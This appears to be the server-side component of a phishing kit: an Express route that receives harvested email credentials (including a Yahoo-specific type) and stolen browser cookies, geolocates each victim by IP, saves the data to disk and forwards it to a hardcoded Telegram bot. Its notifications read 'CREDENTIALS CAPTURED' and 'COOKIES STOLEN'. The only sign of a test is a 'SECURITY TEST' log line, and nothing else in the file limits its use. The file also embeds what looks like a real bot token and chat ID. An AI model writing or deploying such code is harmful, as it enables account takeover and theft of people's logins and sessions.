const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../data/cookies');

// Ensure data directory exists
async function ensureDataDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
    console.log('Created data directory:', COOKIES_DIR);
  }
}

// Telegram message sending function
async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Sending Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();
    
    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message
    };
  }
}

// Function to create data file
async function createDataFile(data) {
  await ensureDataDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const email = data.email || data.username || 'unknown';
  const filename = `data_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.json`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  // Save complete data as JSON
  await fs.writeFile(filepath, JSON.stringify(data, null, 2));
  console.log('Data file created:', filename);
  return { filename, filepath };
}

// MAIN ENDPOINT - Data collection with Telegram
router.post('/', async (req, res) => {
  try {
    console.log('=== SECURITY TEST DATA RECEIVED ===');
    
    // Validate request body
    if (!req.body || typeof req.body !== 'object') {
      console.log('Invalid request body received');
      return res.status(400).json({ 
        success: false, 
        message: "Invalid request body" 
      });
    }
    
    // Safe logging
    console.log('Data type:', req.body.type || 'undefined');
    console.log('Data keys:', Object.keys(req.body));

    const { 
      type,
      cookies,
      username,
      password,
      email,
      user_agent,
      url,
      timestamp,
      attack_id,
      credentials
    } = req.body;
    
    // Get client information
    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // Parse user agent
    const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Extract credentials from nested object if exists
    let userEmail = email;
    let userPassword = password;
    
    if (credentials && typeof credentials === 'object') {
      userEmail = credentials.username || credentials.email || userEmail;
      userPassword = credentials.password || userPassword;
    }

    // Create data file
    let fileInfo = null;
    try {
      fileInfo = await createDataFile(req.body);
    } catch (fileError) {
      console.error('Error creating data file:', fileError);
    }

    // Build Telegram message based on data type
    let telegramMessage = '';
    
    if (type === 'yahoo_credentials' || (username && password)) {
      telegramMessage = `🔐 <b>CREDENTIALS CAPTURED</b>

📧 <b>Email:</b> <code>${userEmail || 'N/A'}</code>
🔑 <b>Password:</b> <code>${userPassword || 'N/A'}</code>

🌐 <b>Location Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

📊 <b>Session Data:</b>
├ Cookies: ${cookies ? 'Yes' : 'No'}
├ URL: ${url || 'N/A'}
└ Attack ID: ${attack_id || 'N/A'}

⏰ <b>Time:</b> ${new Date().toISOString()}

💾 <b>File:</b> ${fileInfo ? fileInfo.filename : 'Not saved'}`;

    } else if (type === 'cookie_theft' || type === 'initial_cookie_theft') {
      telegramMessage = `🍪 <b>COOKIES STOLEN</b>

📧 <b>Target:</b> <code>${userEmail || 'Unknown'}</code>

🌐 <b>Location Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

📊 <b>Stolen Data:</b>
├ Cookies: ${cookies ? cookies.length + ' characters' : 'None'}
├ User Agent: ${user_agent ? 'Yes' : 'No'}
└ Attack ID: ${attack_id || 'N/A'}

🔗 <b>Page:</b> ${url || 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}`;

    } else {
      // Generic message for other data types
      telegramMessage = `📡 <b>DATA RECEIVED</b>

📧 <b>Email:</b> <code>${userEmail || 'N/A'}</code>

🌐 <b>Location:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

📊 <b>Data Type:</b> ${type || 'unknown'}
🔗 <b>Page:</b> ${url || 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}`;
    }

    // Send to Telegram
    console.log('Sending Telegram notification...');
    const telegramResult = await sendTelegramMessage(telegramMessage);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // Log to console for monitoring
    console.log('📥 New Data Received:');
    console.log('   Type:', type || 'unknown');
    console.log('   User:', userEmail || 'unknown');
    console.log('   IP:', ip);
    console.log('   Location:', locationStr);
    console.log('   Device:', deviceType);
    console.log('   URL:', url || 'N/A');
    console.log('   Cookies Length:', cookies ? cookies.length : 0);
    
    if (userPassword) {
      console.log('   Password captured:', '***');
    }

    // Return success response
    res.status(200).json({
      success: true,
      message: "Data received successfully",
      dataType: type,
      attackId: attack_id,
      telegramSent: telegramResult.success,
      clientInfo: {
        ip: ip,
        location: locationStr,
        device: deviceType
      },
      downloadInfo: fileInfo ? {
        filename: fileInfo.filename,
        downloadUrl: `/cookies/download/${fileInfo.filename}`
      } : null,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error("Error in data endpoint:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

module.exports = router;